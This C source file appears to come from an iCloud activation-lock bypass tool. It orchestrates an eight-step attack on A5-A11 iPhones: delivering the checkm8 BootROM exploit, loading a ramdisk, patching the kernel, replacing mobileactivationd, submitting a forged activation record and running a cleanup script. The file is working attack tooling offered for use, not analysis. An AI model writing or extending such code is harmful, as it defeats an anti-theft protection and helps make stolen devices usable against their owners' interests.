/*
 * path_a.c -- A5-A11 bypass orchestration.
 *
 * Implements the bypass_module_t interface for checkm8-vulnerable devices.
 * Delegates exploit delivery to checkm8, jailbreak setup to path_a_jailbreak,
 * activation to record/activation, and cleanup to deletescript.
 */

#include <stdlib.h>
#include <string.h>

#include "bypass/path_a.h"
#include "bypass/deletescript.h"
#include "exploit/checkm8.h"
#include "activation/activation.h"
#include "activation/record.h"
#include "util/log.h"
#include "util/env_config.h"

#include "bypass/path_a_internal.h"

/* ------------------------------------------------------------------ */
/* Staged execution (TR4MPASS_STOP_AFTER)                              */
/* ------------------------------------------------------------------ */

/*
 * Staged-run cutoff, read leniently so a typo'd value can never abort
 * a run that would otherwise succeed.  env_config.c carries no
 * range/suffix logic, so a tiny parser lives here like path_a_ramdisk.c.
 */
static int
path_a_stop_after(void)
{
    const char *val = getenv(TR4MPASS_ENV_STOP_AFTER);
    long v;
    char *end;

    if (!val || val[0] == '\0') {
        log_debug("path_a: %s not set, running all 8 steps",
                  TR4MPASS_ENV_STOP_AFTER);
        return 8;
    }
    v = strtol(val, &end, 10);
    if (end == val || *end != '\0') {
        log_debug("path_a: %s='%s' not numeric, running all 8 steps",
                  TR4MPASS_ENV_STOP_AFTER, val);
        return 8;
    }
    if (v < 1 || v > 8) {
        log_warn("path_a: %s=%ld out of range (1-8), running all 8 steps",
                 TR4MPASS_ENV_STOP_AFTER, v);
        return 8;
    }
    return (int)v;
}

/* ------------------------------------------------------------------ */
/* Module probe/execute                                                */
/* ------------------------------------------------------------------ */

/*
 * path_a_probe -- Check if the device is eligible for Path A bypass.
 * Requires a checkm8-vulnerable chip (A5-A11) in DFU mode.
 */
static int
path_a_probe(device_info_t *dev)
{
    if (!dev) {
        log_error("path_a: probe called with NULL device");
        return -1;
    }

    if (dev->checkm8_vulnerable != 1) {
        log_info("path_a: device not checkm8-vulnerable (A12+ or unknown)");
        return 0;
    }

    if (dev->is_dfu_mode != 1) {
        log_info("path_a: device not in DFU mode");
        return 0;
    }

    log_info("path_a: device is eligible (checkm8-vulnerable, DFU mode)");
    return 1;
}

/*
 * path_a_activate -- Build and submit activation record.
 * Combines record_build, record_to_xml, and activation_submit_record.
 * Returns 0 on success, -1 on failure.
 */
static int
path_a_activate(device_info_t *dev)
{
    plist_t record = NULL;
    char *xml = NULL;
    uint32_t xml_len = 0;
    int ret = -1;

    log_info("path_a: building activation record");
    record = record_build(dev);
    if (!record) {
        log_error("path_a: failed to build activation record");
        return -1;
    }

    xml = record_to_xml(record, &xml_len);
    if (!xml || xml_len == 0) {
        log_error("path_a: failed to serialize activation record to XML");
        record_free(record);
        return -1;
    }

    log_info("path_a: submitting activation record (%u bytes)", xml_len);
    ret = activation_submit_record(dev, xml, xml_len);
    if (ret != 0) {
        log_error("path_a: activation record submission failed");
    } else {
        log_info("path_a: activation record submitted successfully");
    }

    plist_mem_free(xml);
    record_free(record);
    return ret;
}

/*
 * path_a_execute -- Run the full A5-A11 bypass pipeline.
 *
 * Steps:
 *   1. checkm8 DFU exploit
 *   2. Verify pwned state
 *   3. Load ramdisk via pwned DFU
 *   4. Apply jailbreak kernel patches
 *   5. Replace mobileactivationd
 *   6. Build and submit activation record
 *   7. Run deletescript cleanup
 *   8. Verify activation
 */
static int
path_a_execute(device_info_t *dev)
{
    int ret;
    int stop_after;

    if (!dev) {
        log_error("path_a: execute called with NULL device");
        return -1;
    }

    stop_after = path_a_stop_after();

    log_info("path_a: === Starting A5-A11 bypass for %s ===",
             dev->product_type);

    /* Step 1: checkm8 DFU exploit */
    log_info("path_a: [1/8] Delivering checkm8 exploit");
    ret = checkm8_exploit(dev);
    if (ret != 0) {
        log_error("path_a: checkm8 exploit failed");
        return -1;
    }

    if (stop_after == 1) {
        log_info("path_a: staged run: stopping after step 1 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 2: Verify PWND state */
    log_info("path_a: [2/8] Verifying pwned DFU state");
    ret = checkm8_verify_pwned(dev);
    if (ret != 1) {
        log_error("path_a: device not in pwned DFU state (ret=%d)", ret);
        return -1;
    }
    log_info("path_a: PWND verified in serial descriptor");

    if (stop_after == 2) {
        log_info("path_a: staged run: stopping after step 2 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 3: Load ramdisk */
    log_info("path_a: [3/8] Loading ramdisk");
    ret = path_a_load_ramdisk(dev);
    if (ret != 0) {
        log_error("path_a: ramdisk loading failed");
        return -1;
    }

    if (stop_after == 3) {
        log_info("path_a: staged run: stopping after step 3 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 4: Apply jailbreak patches */
    log_info("path_a: [4/8] Applying jailbreak kernel patches");
    ret = path_a_jailbreak(dev);
    if (ret != 0) {
        log_error("path_a: jailbreak failed");
        return -1;
    }

    if (stop_after == 4) {
        log_info("path_a: staged run: stopping after step 4 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 5: Replace mobileactivationd */
    log_info("path_a: [5/8] Replacing mobileactivationd");
    ret = path_a_replace_mobileactivationd(dev);
    if (ret != 0) {
        log_error("path_a: mobileactivationd replacement failed");
        return -1;
    }

    if (stop_after == 5) {
        log_info("path_a: staged run: stopping after step 5 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 6: Build and submit activation record */
    log_info("path_a: [6/8] Submitting activation record");
    ret = path_a_activate(dev);
    if (ret != 0) {
        log_error("path_a: activation failed");
        return -1;
    }

    if (stop_after == 6) {
        log_info("path_a: staged run: stopping after step 6 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 7: Run deletescript cleanup */
    log_info("path_a: [7/8] Running deletescript cleanup");
    ret = deletescript_run(dev);
    if (ret != 0) {
        log_error("path_a: deletescript cleanup failed");
        return -1;
    }

    if (stop_after == 7) {
        log_info("path_a: staged run: stopping after step 7 as requested (TR4MPASS_STOP_AFTER)");
        return 0;
    }

    /* Step 8: Verify activation state */
    log_info("path_a: [8/8] Verifying activation state");
    ret = activation_is_activated(dev);
    if (ret == 1) {
        log_info("path_a: === Bypass successful -- device is activated ===");
        return 0;
    } else if (ret == 0) {
        log_error("path_a: bypass completed but device is NOT activated");
        return -1;
    } else {
        log_error("path_a: failed to query activation state (ret=%d)", ret);
        return -1;
    }
}

/* ------------------------------------------------------------------ */
/* Module definition                                                   */
/* ------------------------------------------------------------------ */

const bypass_module_t path_a_module = {
    .name        = "path_a_checkm8",
    .description = "A5-A11 bypass via checkm8 BootROM exploit"
                   " + jailbreak + activation",
    .probe       = path_a_probe,
    .execute     = path_a_execute
};
